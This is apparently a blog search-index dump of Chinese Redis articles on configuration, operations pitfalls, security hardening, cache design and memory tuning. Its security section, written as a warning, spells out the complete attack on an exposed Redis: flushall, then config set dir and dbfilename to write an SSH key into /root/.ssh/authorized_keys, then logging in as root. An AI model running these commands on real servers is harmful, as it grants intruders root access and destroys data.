这个基准大小和当前大小做比较。如果当前大小超过指定比例，就会触发重写操作。你还需要指定被重写日志的最小尺寸，这样避免了达到指定百分比但尺寸仍然很小的情况还要重写。# 指定百分比为0会禁用AOF自动重写特性。auto-aof-rewrite-percentage 100auto-aof-rewrite-min-size 64mb# 如果设置为yes，如果一个因异常被截断的AOF文件被redis启动时加载进内存，redis将会发送日志通知用户。如果设置为no，erdis将会拒绝启动。此时需要用&quot;redis-check-aof&quot;工具修复文件。aof-load-truncated yes######################### 集群 ########################## 只有开启了以下选项，redis才能成为集群服务的一部分# cluster-enabled yes# 配置redis自动生成的集群配置文件名。确保同一系统中运行的各redis实例该配置文件不要重名。# cluster-config-file nodes-6379.conf# 集群节点超时毫秒数。超时的节点将被视为不可用状态。# cluster-node-timeout 15000# 如果数据太旧，集群中的不可用master的slave节点会避免成为备用master。如果slave和master失联时间超过:(node-timeout * slave-validity-factor) + repl-ping-slave-period则不会被提升为master。# 如node-timeout为30秒，slave-validity-factor为10, 默认default repl-ping-slave-period为10秒,失联时间超过310秒slave就不会成为master。# 较大的slave-validity-factor值可能允许包含过旧数据的slave成为master，同时较小的值可能会阻止集群选举出新master。#为了达到最大限度的高可用性，可以设置为0，即slave不管和master失联多久都可以提升为master# cluster-slave-validity-factor 10# 只有在之前master有其它指定数量的工作状态下的slave节点时，slave节点才能提升为master。默认为1（即该集群至少有3个节点，1 master＋2 slaves，master宕机，仍有另外1个slave的情况下其中1个slave可以提升）# 测试环境可设置为0，生成环境中至少设置为1# cluster-migration-barrier 1# 默认情况下如果redis集群如果检测到至少有1个hash slot不可用，集群将停止查询数据。# 如果所有slot恢复则集群自动恢复。# 如果需要集群部分可用情况下仍可提供查询服务，设置为no。# cluster-require-full-coverage yes######################### 慢查询日志 ########################## 慢查询日志，记录超过多少微秒的查询命令。查询的执行时间不包括客户端的IO执行和网络通信时间，只是查询命令执行时间。# 1000000等于1秒，设置为0则记录所有命令slowlog-log-slower-than 10000# 记录大小，可通过SLOWLOG RESET命令重置slowlog-max-len 128 启动与关闭redis 建立redis数据存储目录 1mkdir /root/redis_data 建立redis日志存储目录 1mkdir /root/redis_log 修改配置文件中的数据存储路径和日志存储路径 启动redis 1redis-server /root/redis-5.0.5/redis.conf 连接并关闭 1234567891011# 方法1redis-cli -h [ip] -p [port]shutdown [command]# 方法2redis-cli -h [ip] -p [port] shutdown [command]# command 是可选参数save：持久化数据nosave： 不持久化数据","path":"2019/09/09/了解redis/","date":"09-09","excerpt":"redis数据库 非关系型数据库 以键(key)和值(value)做映射(mapping) value类型： string：字符串对象 list：列表对象 hash：哈希对象 set：集合对象 zset：有序集合对象","tags":[]},{"title":"redis运维陷阱","text":"Linux配置优化内存分配控制vm.overcommit_memoryLinux对大部分申请内存的请求都回复yes，以便能运行更多的程序。因为申请内存后，并不会马上使用内存，这种技术叫做overcommit。 vm.overcommit_memory用来设置内存分配策略 值 含义 0 标识内核将检查是否有足够可用内存（swap+RAM）。如果有足够可用内存，内存申请通过，否则申请失败并且把错误返回给应用进程 1 表市内可允许超量使用内存直到用完为止 2 表示内核绝不过量使用内存，即整个内存地址空间不能超过swap+50%的RAM值，50%时overcommit_ratio默认值，此参数同样同样支持修改 redis建议将值设置为1， 因为执行bgsave|bgrewriteaof的时候，如果当前内存不足则系统无法执行fork操作，修改为1后可以确保fork操作能在低内存下也能执行 获取与配置1234567# 查看cat /proc/sys/vm/overcommit_memory # 设置# 为了重启之后也生效echo \"vm.overcommit_memory=1\" &gt;&gt; /etc/sysctl.conf sysctl vm.overcommit_memory=1 最佳实践 Redis设置合理的maxmemory，保证机器有20%~30%的闲置内存。 集中化管理AOF重写和RDB的bgsave。 设置vm.overcommit_memory=1，防止极端情况下会造成fork失败 swappinessswap对于操作系统来比较重要，当物理内存不足时，可以将一部分内存页进行swap操作，已解燃眉之急。swap空间由硬盘提供，对于需要高并发、高吞吐的应用来说，磁盘IO通常会成为系统瓶颈。在Linux中，并不是要等到所有物理内存都使用完才会使用到swap，系统参数swppiness会决定操作系统使用swap的倾向程度。swappiness的取值范围是0~100，swappiness的值越大，说明操作系统可能使用swap的概率越高，swappiness值越低，表示操作系统更加倾向于使用物理内存。 值 策略 0 Linux3.5及以上：宁愿用OOM killer也不用swapLinux3.4及以下：宁愿用swap也不用OOM killer 1 Linux3.5及以上：宁愿用swap也不用OOM killer 60 默认值 100 操作系统会主动使用swap OOM killer是指Linux操作系统发现可用内存不足时强制杀死一些用户进程（非内核进程）来保证系统有足够的可用内存 获取与配置1234567# 获取cat /proc/sys/vm/swappiness# 配置# 写入文件是为了重启后也能生效echo \"sysctl vm.swappiness=10\" &gt;&gt; /etc/sysctl.confsysctl vm.swappiness=10 查看swap信息查看swap和RAM使用情况 free -m可以查看当前RAM、SWAP的使用情况 查看系统正在使用的记录 vmstat可以查看负载、CPU、内存、swap、IO的相关详细属性，si 和 so表示swap的写入和写出情况 查看指定进程的swap情况 在linux目录中 /proc/{pid}目录是存储指定进程的相关信息，其中/proc/{pid}/smaps记录了当前进程所对应的内存映射信息， 如果Linux&gt;3.5，vm.swapniess=1，否则vm.swapniess=0，从而实现如下两个目标： 物理内存充足时候，使Redis足够快。 物理内存不足时候，避免Redis死掉（如果当前Redis为高可用，死掉比阻塞更好）。 THPLinux kernel在2.6.38内核增加了THP特性，支持大内存页（2MB）分配，默认开启。当开启时可以降低fork子进程的速度，但fork操作之后，每个内存页从原来4KB变为2MB，会大幅增加重写期间父进程内存消耗。同时每次写命令引起的复制内存页单位放大了512倍，会拖慢写操作的执行时间，导致大量写操作慢查询. 12345678910# 查看当前系统设置 输出 always [madvise] never always：透明大页启动了、[never]表示透明大页禁用、[madvise]表示（只在MADV_HUGEPAGE标志的VMA中使用THPcat /sys/kernel/mm/transparent_hugepage/enabled # 返回0也意味着传统大页禁用了（传统大页和透明大页）cat /proc/sys/vm/nr_hugepages # 临时修改关闭THPecho \"always madvise [never]\" &gt; /sys/kernel/mm/transparent_hugepage/enabled # 需要重启后继续生效可以将上面临时命令写入开机启动的脚本中 OMM killerOOM killer会在可用内存不足时选择性地杀掉用户进程， OOM killer进程会为每个用户进程设置一个权值，这个权值越高，被“下手”的概率就越高，反之概率越低。每个进程的权值存放在/proc/{progress_id}/oom_score中，这个值是受/proc/{progress_id}/oom_adj的控制，oom_adj在不同的Linux版本中最小值不同，当oom_adj设置为最小值时，该进程将不会被OOM killer杀掉。 12345678910# 设置oom_adj， value越低越好echo &#123;value&#125; &gt; /proc/$&#123;process_id&#125;/oom_adj# 脚本#!/bin/bashfor redis_pid in $(pgrep -f \"redis-server\")do echo -17 &gt; /proc/$&#123;redis_pid&#125;/oom_adjdone NTPNTP是一种保证不同机器时钟一致性的服务。如果时钟不一致对于一些异常情况的日志排查对造成影响 ulimit通过ulimit查看和设置系统当前用户进程的资源数。其中ulimit-a命令包含的open files参数，是单个用户同时打开的最大文件个数。如果maxclients是默认1W的设置，那么redis启动时会在日志中建议open files至少设置成10032个，因为maxclients需要使用1W个，redis内部会使用最多32个，这个open files必须得用户手动设置，redis没有权限设置，并且会提示当前系统的open files数量，以及将maxclients设置成4064个（32个redis内部使用） 12# 设置open filesulimit –Sn &#123;max-open-files&#125;745 TCP backlogRedis默认的tcp-backlog值为511，可以通过修改配置tcp-backlog进行调整 123456# 查看tcp backlogcat /proc/sys/net/core/somaxconn# 修改echo 511 &gt; /proc/sys/net/core/somaxconn flushall/flushdb误操作缓存与储存被误操作flush后，根据当前redis是缓存还是储存使用策略有所不同 缓存：缓存中的数据可以从数据源重新进行构建 存储：对业务方可能会造成巨大的影响，也许flush操作后的数据是重要配置，也可能是一些基础数据，也可能是业务上的重要一环，如果没有提前做业务降级操作，那么最终反馈到用户的应用可能就是报错或者空白页面等，其后果不堪设想。即使做了相应的降级或者容错处理，对于用户体验也有一定的影响 借助AOF机制恢复借助aof恢复必须配置了appendonly yes 开启了AOF的话执行了flushall操作在文件中也不过是追加了一条记录，虽然数据被清理掉了，但是AOF文件还是保存者flush之前的完整数据 123*1$8flushall 误操作flush后要避免AOF重写操作，如果AOF进行了重写，那么意味着之前的数据就丢掉了，AOF也无法恢复，所以要做以下两件事 调大AOF重写参数auto-aof-rewrite-percentage和auto-aof-rewrite-min-size，让Redis不能产生AOF自动重写。 拒绝手动bgrewriteaof 随后删除AOF文件中的flushall相关操作，然后使用redis-check-aof工具检测和修复AOF文件，确保文件格式正确 借助RDB恢复如果配置中没有配置自动策略信息 123save 900 1save 300 10save 60 10000 那么除非手动执行过save、bgsave或者发生了主从全量复制，否则RDB文件也会保存flush之前的操作。所以如果利用RDB恢复需要防止手动执行save、bgsave操作，而且RDB的实时性不如AOF高，很可能是很久之前主从复制生成的，或者之前save和bgsave备份的 如果配置了自动策略信息，由于flush操作涉及键比较多，很容易触发RDB重写RDB文件会被清除覆盖，恢复无望 所以AOF相比较是一个比较合理的方式， 但是如果AOF关闭了，RDB也可以恢复部分数据。 主从节点变化redis从节点同步了主节点的flush命令， 所以从节点的数据、RDB和AOF也主节点没有任何区别 快速恢复数据 防止AOF重写 1config set auto-aof-rewrite-percentage 1000config set auto-aof-rewrite-min-size 100000000000 去除主从AOF文件中的flush相关内容 123*1$8flushall 重启redis主节点服务器恢复数据 redis安全以下配置的服务器不安全 攻击者可以直接访问到这台机器（同一局域网或者机器有外网IP） redis以6379为启动端口，并且端口时对外网开放 redis是以root用户启动的 redis没有设置密码 redis的bind设置为0.0.0.0或者“” 通过上面这些配置，攻击者可以充分利用redis的dir和dbfilename两个配置通过config set动态设置，以及RDB持久化特性将公钥写入目标机器的 /root/.ssh/authotrized_keys文件中 以下是攻击步骤 12345678910111213141516171819202122232425# 确认可以ping通redis-cli -h Ip -p 6379 ping# 清空数据库redis-cli -h Ip -p 6379 flushall# 攻击者在自己机器上生成秘钥cd /rootssh-keygen -t rsa(echo -e \"\\n\\n\"; cat /root/.ssh/id_rsa.pub; echo -e \"\\n\\n\") &gt; my.pub # 将crackit的值设置为公钥cat my.pub | redis-cli -h Ip -p 6379 -x set crackit# 设置dir的路径为/root/.ssh dbfilename为authorized_keysconfig set dir /root/.sshconfig set dbfilename authorized_keys# 生成RDBsave# ssh登录ssh root@Ip redis密码机制简单密码机制通过requirepass配置设置redis密码 如果设置了requirepassredis需要执行命令时就必须输入密码redis-cli -a password或者连接后输入auth password 密码必须64位以上，因为redis并发很高，如果密码过于简单可以通过短时间的暴力破解 如果是主从结构需要在从节点设置masterauth，否则会在成主从同步时效 auth是通过明文进行传输的，也不是十分可靠，有可能被劫持 伪装危险命令伪装 危险命令 危害 keys 如果键值较多，存在阻塞redis的可能 flushall/flushdb 数据全部被清除 save 如果键过多存在阻塞redis的可能性 debug 例如debug reload会重启redis config config应该只能有管理员使用 shutdown 停止Redis 对于上面这些命令可以通过rename-command命令重命名，例如rename-command flushall qwertyuiop这样就将flushall命令重命名为qwertyuiop 伪装后的麻烦 管理员要对自己的客户端进行修改。例如：jedis.flushall()操作内部使用的是flushall命令。所以客户端也要将命令改为rename-command修改过的命令。 rename-command配置不支持config set，所以启动前一定要确定哪些命令需要rename-command，以免后期需要重启服务器 如果AOF和RDB文件包含了被rename-command重命名之前的命令。redis将无法启动， 因为他此时识别不了rename-command之前的命令 redis中有些命令是写死的，rename-command可能造成redis无法正常工作，例如sentinel中就是用了config命令 使用注意事项 危险命令（flushall等）一定要重命名，不管是内网还是外网 启动之前就配置好全部的rename-command 如果涉及主从， 一定要保证主从的节点配置一致，否则存在主从数据不一致的可能性 防火墙储存服务器的端口通常无需对外开放，防火墙可以限制外网访问 bindbind的含义是指接收来自某个网卡的客户端请求，例如bind 10.0.0.1那么redis访问只能通过10.0.0.1这块网卡进入，其他网卡（例如：127.0.0.1）都无法连接到redis。同时bind可以板顶多个网卡bind IP IP。如果对bind没有要求可以设置bind为0.0.0.0 注意事项 bind应该在启动之前设置好，因为bind不可以使用config set修改 如果机器有外网，但是仅仅给内网使用， 可以用bind排除外网网卡或者去除外网网卡限制流量从外网进入 如果客户端和redis处于同一台机器可以使用127.0.0.1回环地址 redis3.2以上提供了protected-mode配置，并且默认开启，如果当前机器开启了这个配置并且没有设置密码，没有bind网卡，那么就只允许来自本机的访问相当于配置了bind 127.0.0.1 定期备份数据备份 默认端口默认端口会提高入侵者发现的可能， 因为redis的6379必然在端口扫描的列表中 使用非root用户启动 创建普通用户 12$ groupadd admin #新建admin用户组$ useradd boy -g admin #新建用户boy并加入admin组中 将redis配置文件复制一份到新创建的用户家目录下 1$ cp -rf /usr/local/redis/etc/redis.conf /home/boy/ #强制复制redis的配置文件到boy用户的家目录下 修改redis配置文件及创建相应的目录 1234567$ vim /home/boy/redis.conf #编辑redis配置文件变更以下内容将`pidfile /var/run/redis.pid`修改为`pidfile /home/boy/run/redis.pid`将`dir ./`修改为`dir /home/boy/redis`$ mkdir -p /home/boy/run #创建run目录$ mkdir -p /home/boy/redis #创建redis目录$ chown -R boy:admin /home/boy #将boy用户家目录下的所有文件所属者与所属组修改为boy:admin 修改redis目录权限及用普通用户启动redis服务 123$ chown -R boy:admin /usr/local/redis #变更redis目录权限为boy用户所有$ su boy #切换到boy用户$ /usr/local/redis/bin/redis-server /home/boy/redis.conf &amp; #用boy用户后台启动redis 处理bigkeybigkey是指key对应的value所占用的内存空间比较大 字符串类型：体现在单个value值很大，一般认为超过10KB就是bigkey，但这个值和具体的OPS相关 非字符串类型：哈希、列表、集合、有序集合，体现在元素个数过多。 危害 内存空间不均匀（平衡）：例如在Redis Cluster中，bigkey会造成节点的内存空间使用不均匀 超时阻塞：由于Redis单线程的特性，操作bigkey比较耗时，也就意味着阻塞Redis可能性增大 网络拥塞：每次获取bigkey产生的网络流量较大，假设一个bigkey为1MB，每秒访问量为1000，那么每秒产生1000MB的流量，对于普通的千兆网卡（按照字节算是128MB/s）的服务器来说简直是灭顶之灾，而且一般服务器会采用单机多实例的方式来部署，也就是说一个bigkey可能会对其他实例造成影响。 如何发现redis-cli --bigkeys可以统计bigkey的分布 如果需要自己定义bigkey的大小，去查找定位一个bigkey，需要执行debug object key查看serializedlength属性，他表示key对应的value序列化之后的字节数，同时encoidng表示类型。 serializedlength不代表真实的字节大小，它返回对象使用RDB编码序列化后的长度，值会偏小，但是对于排查bigkey有一定辅助作用，因为不是每种数据结构都有类似strlen这样的方法。 如何处理 被动收集：许多开发人员确实可能对bigkey不了解或重视程度不够，但是这种bigkey一旦大量访问，很可能就会带来命令慢查询和网卡跑满问题，开发人员通过对异常的分析通常能找到异常原因可能是bigkey，这种方式虽然不是被笔者推荐的，但是在实际生产环境中却大量存在，建议修改Redis客户端，当抛出异常时打印出所操作的key，方便排查bigkey问题 主动检测：scan+debug object：如果怀疑存在bigkey，可以使用scan命令渐进的扫描出所有的key，分别计算每个key的serializedlength，找到对应bigkey进行相应的处理和报警，这种方式是比较推荐的方式， scan+debug object可能会比较慢，可以利用pipeline机制完成，同样如果元素较多的数据结构debug object执行速度会比较慢。存在阻塞redis的可能，如果有从节点，建议在从节点上执行 如何删除value越大或者元素个数越多删除的时间也会随之增加，所以删除bigkey也有可能会产生阻塞 string String类型使用del命令通常不会阻塞 hash、list、set、zset 使用pipeline多次删除部分（100个一组），删除完其字元素后再del这个bigkey redis4.0以上有lazy free：lazy free可译为惰性删除或延迟释放；当删除键的时候,redis提供异步延时释放key内存的功能，把key释放操作放在bio(Background I/O)单独的子线程处理中，减少删除big key对redis主线程的阻塞。有效地避免删除big key带来的性能和可用性问题。通过命令unlink使用，同时flushall和flushdb 添加async也可以异步清理 寻找热点key客户端统计利用客户端（例如：jedis）统计key的使用/修改次数 问题 无法预知key的数量，有可能会导致内存泄露 只能了解当前客户端的热点key，无法实现规模化统计 代理统计graph TD subgraph clients A(client1) B(client2) C(client3) end D(代理:收集统计) E((redis)) A-->|redis command|D B-->|redis command|D C-->|redis command|D D-->E E-->D redis服务器使用monitor命令统计热点key graph TD subgraph clients A(client1) B(client2) C(client3) end D((redis)) E(解析monitor输出统计) A-->|redis command|D B-->|redis command|D C-->|redis command|D D-->|输出|E monitor命令在高并发条件下会存在内存暴增和影响redis性能的隐患 只能统计一个redis节点的热点key，对于redis集群需要进行汇总统计 机器通过抓取TCP数据包通过redis的RESP协议获取，这种也只能统计一个redis机器的热点，对于redis集群需要进行汇总统计 方案 优点 缺点 客户端 实现简单 内存泄露隐患维护成本高只能统计单个客户端 代理 代理是客户端和服务端的桥梁，实现最方便系统 增加代理端的开发部署成本 服务端 实现简单 monitor本省的使用成本和危害，只能短时间使用只能统计当个redis节点 机器 对于客户端和服务器无入侵 需要专业的运维团队开发，并且增加了机器的部署成本 解决热点key 拆分复杂数据结构：如果当前key的类型是一个二级数据结构，例如哈希类型。如果该哈希元素个数较多，可以考虑将当前hash进行拆分，这样该热点key可以拆分为若干个新的key分布到不同Redis节点上，从而减轻压力。 迁移热点key：以Redis Cluster为例，可以将热点key所在的slot单独迁移到一个新的Redis节点上，但此操作会增加运维成本。 本地缓存加通知机制：可以将热点key放在业务端的本地缓存中，因为是在业务端的本地内存中，处理能力要高出Redis数十倍，但当数据更新时，此种模式会造成各个业务端和Redis数据不一致，通常会使用发布订阅机制来解决类似问题。","path":"2019/09/07/redis运维陷阱/","date":"09-07","excerpt":"Linux配置优化内存分配控制vm.overcommit_memoryLinux对大部分申请内存的请求都回复yes，以便能运行更多的程序。因为申请内存后，并不会马上使用内存，这种技术叫做overcommit。","tags":[]},{"title":"redis缓存设计","text":"使用缓存的收益与成本收益 读写加速：因为缓存通常是全内存的，而存储层通常读写性能不够强悍，在客户端与存储层之间增加一个缓存层可以有效的加速读写 减低后端负载： 减少后端的复杂计算和访问次数 成本 数据不一致：因为缓存介于客户端与存储层之间，所以存储层的数据存在一定时间窗口不一致性，时间的长度与更新策略有关 运维成本：增加了缓存层，运维的成本自然增加 代码维护成本：代码需要处理缓存层与存储层的逻辑 运用场景 开销大的复杂计算 加速请求 缓存更新策略 LRU/LFU/FIFO算法剔除 使用场景：剔除算法通常用于缓存使用量超过了预设的最大值时候，如何对现有的数据进行剔除。例如Redis使用maxmemory-policy这个配置作为内存最大值后对于数据的剔除策略。 一致性：要清理哪些数据是由具体算法决定，开发人员只能决定使用哪种算法，所以数据的一致性是最差的。 维护成本：算法不需要开发人员自己来实现，通常只需要配置最大maxmemory和对应的策略即可。开发人员只需要知道每种算法的含义，选择适合自己的算法即可。 超时剔除 使用场景：超时剔除通过给缓存数据设置过期时间，让其在过期时间后自动删除，例如Redis提供的expire命令。如果业务可以容忍一段时间内，缓存层数据和存储层数据不一致，那么可以为其设置过期时间。在数据过期后，再从真实数据源获取数据，重新放到缓存并设置过期时间。例如一个视频的描述信息，可以容忍几分钟内数据不一致，但是涉及交易方面的业务，后果可想而知。 一致性：一段时间窗口内（取决于过期时间长短）存在一致性问题，即缓存数据和真实数据源的数据不一致。 维护成本：维护成本不是很高，只需设置expire过期时间即可，当然前提是应用方允许这段时间可能发生的数据不一致。 主动更新 使用场景：应用方对于数据的一致性要求高，需要在真实数据更新后，立即更新缓存数据。例如可以利用消息系统或者其他方式通知缓存更新。 一致性：一致性最高，但如果主动更新发生了问题，那么这条数据很可能很长时间不会更新，所以建议结合超时剔除一起使用效果会更好。 维护成本：维护成本会比较高，开发者需要自己来完成更新，并保证更新操作的正确性。 低一致性的业务使用最大内存淘汰策略 高一致性业务使用超时剔除和主动更新，这样即使主动更新出了问题也能保证数据过期时间后删除脏数据 缓存粒度redis中缓存存储层的数据是存储全部属性还是存储部分属性这就是缓存粒度问题。 通用性：缓存全部数据比部分数据更加通用，但是实际上需要使用几个重要的属性 空间占用：全数据会造成数据浪费，并且由于数据量大会造成网络开销加剧，由于数据量增大序列化与反序列化CPU的消耗也会增加 代码维护：一旦代码需要新的字段，有可能需要刷新缓存数据 穿透优化缓存穿透：在查询一个根本不存在的数据时会发生以下步骤 缓存层不命中-&gt;存储层不命中，不将空结果写回缓存-&gt;返回空结果。这种情况每次都要到存储层去查询，失去了缓存保护后端存储的意义 引发的原因：业务代码或者数据出现问题；恶意攻击、爬虫造成大量空命中 解决方法 缓存空对象：将存储层的空结果保存，仅仅保存空结果的话意味着需要存储更多的键需要更多的存储空间，所以应该设置一个较短的过期时间可以自动剔除。但是设置过期时间后系统正好插入了这条记录，那么就会出现缓存层和存储层数据不一致，这个时候可以利用消息系统或者其他方式清除缓存层中的空对象 boolean过滤器拦截：可以将存储层含有的信息做成boolean过滤器，如果boolean过滤器中不存在就不会访问存储层。例如将所有含有信息的id以bitmap实现，查询的信息id先与bitmap碰撞，存在再查询（这种方法适用于数据命中不高、数据相对固定、实时性低（通常是数据集较大）的应用场景，代码维护较为复杂，但是缓存空间占用少） 解决缓存穿透 使用场景 维护成本 缓存空对象 数据命中不高数据频繁变化实时性高 代码维护简单需要过多内存空间数据不一致 布隆过滤器 数据命中不高数据相对固定实时性低 代码维护复杂缓存空间占用少 无底洞优化无底洞现象：添加节点却性能下降 引发原因：通常使用hash函数将key映射到各个节点上，造成key的分布与业务无关，同时随着访问量增长需要添加大量节点做水平扩容，导致键值分布到更多的节点上，所以一次get操作可能要从多台服务器获取信息，这样就需要多次网络请求，而通常一次get只需要一次网络请求。所以多次网络操作会随着节点数增加次数也会增加，网络连接数过多也会影响节点性能 解决方法： 命令本身优化，例如优化sql语句 减少网络通信次数 减低连接成本，使用线程池或者NIO 方案 优点 缺点 网络IO 串行命令（多次get一条一条获取） 编程简单如果少量keys，性能可以满足要求 大量keys请求延迟 O(keys) 串行IO（通过计算每个key所在节点，通过pipeline顺序执行获取） 编程简单少量节点性能满足要求 大量node延迟严重 O(nodes) 并行IO（在串行IO基础上通过多线程执行并发执行pipeline） 利用并行特性，延迟数取决于最慢的节点 编程复杂由于多线程，问题定位可能比较难 O(max_slow(nodes)) hash_tag（通过hash_tag强制多个key分配到一个节点上） 性能最高 业务维护成本较高容易出现数据倾斜 O(1) 雪崩优化缓存雪崩：缓存层因为某些原因不能提供服务，导致所有的请求打到存储层，造成存储层的调用暴增导致宕机等情况 解决方法： 保证缓存服务高可用性，使用哨兵或者集群 依赖隔离组件为后端限流并降级：使用Hystrix等将出现问题的服务进行降级，例如接口拒绝服务（能访问但是提示服务器繁忙）、页面拒绝服务（直接跳转到nginx的静态页面）、延迟持久化（页面访问照常，但是涉及记录变更会提示稍晚才能看到结果，将数据记录到异步队列或者log，服务恢复后执行）。 提前演练：为后端负载可能出现的问题提前做预案 热点key重建优化热点key：使用缓存+过期时间策略可以加速数据读写，又能保证数据的定期更新。但是如果同时出现以下两个情况会造成巨大问题： 当前key时一个热点key，并发量非常大 重建缓存无法短时间内完成（可能是一个十分复杂的计算） 在缓存失效的瞬间，继续有大量请求这个key，那么这个时候每个请求都会引发重建缓存，将造成有大量线程来重建缓存，造成后端负载加大，甚至可能会让应用崩溃 解决方法： 互斥锁：只允许一个线程重建缓存，其他线程等待重建缓存的线程执行完，重新从缓存获取数据即可，可以使用redis的nx参数获取锁，加锁成功的线程负责重建 永远不过期：在redis中不设置expire，但是对象中存储了一个逻辑到期时间，在服务运行时发现逻辑设定时间到期，就开始缓存重建 解决方案 优点 缺点 简单分布式锁 思路简单保证一致性 代码复杂度增大存在死锁风险存在线程池阻塞的风险 永远不过期 基本杜绝热点key问题 不保证一致性逻辑过期时间增加代码维护成本和内存成本","path":"2019/09/07/redis缓存设计/","date":"09-07","excerpt":"使用缓存的收益与成本收益 读写加速：因为缓存通常是全内存的，而存储层通常读写性能不够强悍，在客户端与存储层之间增加一个缓存层可以有效的加速读写 减低后端负载： 减少后端的复杂计算和访问次数 成本 数据不一致：因为缓存介于客户端与存储层之间，所以存储层的数据存在一定时间窗口不一致性，时间的长度与更新策略有关 运维成本：增加了缓存层，运维的成本自然增加 代码维护成本：代码需要处理缓存层与存储层的逻辑","tags":[]},{"title":"redis内存优化","text":"内存消耗分类redis内存消耗主要为： 自身内存+对象内存+缓冲内存+内存碎片graph LR subgraph used_memory A(自身内存) B(对象内存) C(缓冲内存) end subgraph used_memory_rss-used_memory D(内存碎片) end 内存对象内存对象是redis内存占用最大的一个部分，用户的所有数据均在内存对象中存储 redis是key-value存储类型，所以每次创建键值对时，至少创建两个类型对象，key对象和value对象， key对象为字符串对象， value对象可以为字符串、列表、哈希、集合、有序集合（bitmap和HyperLogLog使用的字符串实现，GEO使用有序集合实现），所以每一个键值对占用的内存为sizeof(key)+sizeof(value) 缓冲内存缓冲内存主要包括：客户端缓冲，复制积压缓冲区、AOF缓冲区 客户端缓冲所有接入到redis服务器TCP连接的输入输出缓冲都为客户端缓冲，输入缓冲无法设置， 一旦超过1G将断开连接，输出缓冲通过client-output-buffer-limit控制 普通客户端通过client-output-buffer-limit norma l000配置，对复制和订阅的客户端之外的所有连接。如果有大量慢连接客户端可以通过maxclients限制客户端连接的数量 从客户端从客户端是主节点为每个从节点单独建立的一条用于命令复制的客户端，通过client-output-buffer-limit slave 256mb 64mb 60配置，当使用内存达到256mb时断开连接，或者连续60s使用64mb也将断开连接。 当主从节点之间网络延迟较高或者主节点挂载大量从节点时会消耗大量内存。 订阅客户端通过client-output-buffer-limit pubsub 32mb 8mb 60配置， 如果订阅服务使用内存超过32mb将断开连接，或者连续使用8mb内存超过60s也将断开连接， 当生产消息过快时，输出缓冲区会积压造成缓冲区空间溢出 复制积压缓冲区通过repl-backlog-size设置，默认1MB。复制积压缓冲区整个主节点只有一个，所有从节点共享这个复制积压缓冲区，因此可以将这个值适当提高 AOF缓冲区用于redis重写期间保存最近的写入命令，AOF缓冲区的空间消耗用户无法控制，消耗的内存取决于AOF重写时间和写入命令的数量，但是这部分空间占用很小 内存碎片redis默认使用jemalloc内存分配器，还有glibc、tcmalloc两种可选。 内存分配器为了更好地管理和重复利用内存，分类内存策略一般采用固定范围的内存块进行分配。 例如jemalloc在64位系统中将内存空间划 分为：小、大、巨大三个范围。每个范围内又划分为多个小的内存块单位， 小：[8byte]，[16byte，32byte，48byte，…，128byte]，[192byte，256byte，…，512byte]，[768byte，1024byte，…，3840byte] 大：[4KB，8KB，12KB，…，4072KB] 巨大：[4MB，8MB，12MB，…] 比如当保存5KB对象时jemalloc可能会采用8KB的块存储，而剩下的3KB空间变为了内存碎片不能再分配给其他对象存储。 正常的碎片率（mem_fragmentation_ratio=used_memory_rss/used_memory）在1.03左右。 以下场景容易出现高内存碎片问题 频繁做更新操作，对已存在的键执行append、setrange等更新操作 大量过期键删除，释放的空间无法得到充分利用，导致碎片率上升 高内存碎片时解决方法 数据对齐：在条件允许的情况下，尽量采用数字类型或者固定长度字符串 安全重启：重启节点可以做到碎片重新整理， 可以配合sentinel和cluster将碎片率过高的主节点转换为从节点进行安全重启 子进程内存消耗子进程内存消耗主要指执行AOF/RDB重写时Redis创建的子进程内存消耗。 redis执行fork操作产生的子进程内存占用对外表现与父进程相同，理论上需要已被的物理内存来完成重写操作，但是linux具有写时复制技术，父子进程会共享相同的物理内存页，当父进程处理写请求时会对需要修改的页复制出一份副本完成写操作，而子进程依然读取fork时整个父进程的内存快照 graph LR subgraph 重写中执行了写入命令 D(重写开始前数据使用的内存) E(父进程) F(子进程) G(写入修改过的数据占用内存) F-->D E-->D E-->G end subgraph 创建时 A(重写开始前数据使用的内存) B(父进程) C(子进程) B-->A C-->A end redis产生的子进程并不需要消耗1倍的父进程内存，实际消耗根据期间写入的写入命令量决定 sysctl vm.overcommit_memory=1允许内核可以分配所有的物理内存，防止Redis进程执行fork时因系统剩余内存不足而失败 Linux Kernel在2.6.38内核增加了Transparent Huge Pages（THP）机制 虽然开启THP可以降低fork子进程的速度，但之后copy-on-write期间复制内存页的单位从4KB变为2MB，如果父进程有大量写命令，会加重内存拷贝量，从而造成过度内存消耗。 应该关闭THP，防止copy-on-write期间内存过度消耗 内存管理设置内存上限通过maxmemory设置内存最大可用量， maxmemory限制的时used_memory的内存，由于内存碎片的存在，实际消耗的内存会比设置的大。redis默认可以无限使用内存，所以所有的redis进程都要配置maxmemory 动态调整内存上限如果设置的内存上限预估错误，可以通过config set maxmemory命令动态修改最大可用内存 内存回收策略回收机制主要体现在以下两个方面： 删除过期键 内存使用达到maxmemory上限时触发内存溢出控制策略 删除过期键redis的内存对象都可以设置过期属性，保存在过期字典中。由于进程内保存大量的键，维护每个键精准的过期删除机制会导致消耗大量的CPU， 所以REDIS采用惰性删除和定时任务删除机制实现过期键的内存回收。 惰性删除：当客户端读取带有超市属性的键时，如果已经超过键设置的过期时间，会执行删除操作并返回空。这样就不用维护TTL链表来处理过期键的删除。但是如果过期键一直没有访问将无法及时删除，从而导致内存不能释放。 定时任务删除：redis内部维护一个定时任务，默认10次/S（hz配置）。通过以下方式回收过期键 内存溢出控制策略通过maxmemory-polic配置 控制策略共6种 noeviction：默认策略，不会删除任何数据，拒绝所有写入操作并返回客户端错误信息（error）OOM command not allowed when used memory，此时Redis只响应读操作。 volatile-lru：根据LRU算法删除设置了超时属性（expire）的键，直到腾出足够空间为止。如果没有可删除的键对象，回退到noeviction策略。 allkeys-lru：根据LRU算法删除键，不管数据有没有设置超时属性，直到腾出足够空间为止。 allkeys-random：随机删除任意键，直到腾出足够空间为止。 volatile-random：随机删除过期键，直到腾出足够空间为止。 volatile-ttl：根据键值对象的ttl属性，删除最近将要过期数据。如果没有，回退到noeviction策略。 如果要收缩redis内存的场景， 频繁回收的内存成本很高，主要在于查找可回收键和删除键的开销同时如果有从节点，也会导致写放大的问题，所以可以通过设置maxmemory大小以及回收策略达到快速收缩内存的目的， 但是这个操作会导致数据丢失和短暂的阻塞问题，一般在缓存场景下使用。 内存优化RedisObject对象graph TB subgraph redisObject A(type:4) B(encoding:4) C(lru) D(int refcount) E(void *ptr) end A(type:4)-->A1((对象类型)) 